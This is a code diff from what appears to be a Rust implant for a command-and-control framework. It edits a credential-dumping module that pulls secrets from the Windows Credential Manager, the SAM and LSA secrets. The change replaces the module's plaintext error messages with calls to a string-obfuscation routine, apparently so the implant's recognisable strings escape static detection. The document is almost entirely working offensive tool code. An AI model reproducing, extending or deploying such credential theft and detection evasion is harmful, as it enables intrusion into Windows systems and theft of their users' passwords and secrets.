@@ -29,7 +29,7 @@ unsafe fn enum_credentials() -> Result<String, String> {
     let mut creds: *mut PCREDENTIALW = ptr::null_mut();
 
     if CredEnumerateW(ptr::null(), 0, &mut count, &mut creds) == 0 {
-        return Err("CredEnumerateW failed or no credentials found".to_string());
+        return Err(crate::obfstr::d(crate::obfstr::S_CRED_FAIL_ENUM));
     }
 
     let mut results = Vec::new();
@@ -82,7 +82,8 @@ fn dump_sam() -> Result<String, Box<dyn Error>> {
         Ok(String::from_utf8_lossy(&output.stdout).to_string())
     } else {
         Err(format!(
-            "Failed to enumerate local users: {}",
+            "{}: {}",
+            crate::obfstr::d(crate::obfstr::S_CRED_FAIL_ENUM),
             String::from_utf8_lossy(&output.stderr)
         ).into())
     }
@@ -100,13 +101,14 @@ fn dump_lsa_secrets() -> Result<String, Box<dyn Error>> {
     if output.status.success() {
         let result = String::from_utf8_lossy(&output.stdout).to_string();
         if result.trim().is_empty() {
-            Ok("No LSA secrets accessible (requires SYSTEM privileges)".to_string())
+            Ok(crate::obfstr::d(crate::obfstr::S_CRED_NO_LSA))
         } else {
             Ok(result)
         }
     } else {
         Err(format!(
-            "Failed to access LSA secrets: {}",
+            "{}: {}",
+            crate::obfstr::d(crate::obfstr::S_CRED_FAIL_LSA),
             String::from_utf8_lossy(&output.stderr)
         ).into())
     }
@@ -117,7 +119,7 @@ pub fn credentials_dump(task: &AgentTask) -> Result<serde_json::Value, Box<dyn E
     {
         return Ok(mythic_error!(
             task.id,
-            "Credentials dump is only supported on Windows"
+            format!("Credentials dump {}", crate::obfstr::d(crate::obfstr::S_WINDOWS_ONLY))
         ));
     }
 
@@ -133,14 +135,14 @@ pub fn credentials_dump(task: &AgentTask) -> Result<serde_json::Value, Box<dyn E
             _ => {
                 return Ok(mythic_error!(
                     task.id,
-                    format!("Unknown source: {}. Valid sources: vault, credman, sam, lsa_secrets", args.source)
+                    format!("{}: {}. {}", crate::obfstr::d(crate::obfstr::S_CRED_UNKNOWN), args.source, crate::obfstr::d(crate::obfstr::S_CRED_VALID))
                 ));
             }
         };
 
         match result {
             Ok(output) => Ok(mythic_success!(task.id, output)),
-            Err(e) => Ok(mythic_error!(task.id, format!("Failed to dump credentials: {}", e))),
+            Err(e) => Ok(mythic_error!(task.id, format!("{}: {}", crate::obfstr::d(crate::obfstr::S_CRED_FAIL), e))),
         }
     }
 }
